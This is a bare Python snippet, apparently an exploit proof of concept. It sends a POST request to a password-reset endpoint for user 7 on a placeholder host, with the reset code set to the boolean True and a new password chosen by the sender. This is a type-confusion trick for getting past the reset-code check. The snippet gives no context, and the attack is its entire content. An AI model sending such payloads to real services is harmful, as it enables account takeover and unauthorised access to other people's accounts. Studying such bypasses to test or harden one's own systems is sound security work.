import requests
requests.post('https://council.example/backend/backend/auth/reset/7',
              json={'code': True, 'password': 'example'})
